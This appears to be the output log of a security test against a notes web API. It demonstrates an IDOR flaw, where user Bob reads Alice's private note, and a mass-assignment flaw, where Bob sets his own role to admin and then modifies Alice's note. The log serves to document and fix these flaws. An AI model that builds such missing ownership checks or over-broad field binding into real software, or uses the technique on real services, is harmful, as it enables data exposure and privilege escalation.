### VULN B: GET /notes/{id} — IDOR, no ownership check ###
-- Alice reads her own note 1 (legit) --
{"id":1,"owner_id":1,"title":"alice private","body":"alice's secret plans"}

-- Bob (not owner, not admin) reads Alice's private note 1 --
{"id":1,"owner_id":1,"title":"alice private","body":"alice's secret plans"}

### VULN C: PUT /me — mass assignment, privilege escalation ###
-- Bob before: --
{"accent":"#64b5f6","user":{"id":2,"name":"Bob","email":"bob@example.test","role":"user"}}

-- Bob PUTs role=admin (only intends to update name/email, but Role/ID are also bound) --
{"id":2,"name":"Bob","email":"bob@example.test","role":"admin"}

-- Bob after: role is now admin --
{"accent":"#ffd54f","user":{"id":2,"name":"Bob","email":"bob@example.test","role":"admin"}}

-- Bob (now self-declared admin) can edit/delete anyone's notes, e.g. note 1 owned by alice --
HTTP/1.1 204 No Content
Date: Sun, 27 Sep 2026 10:30:17 GMT

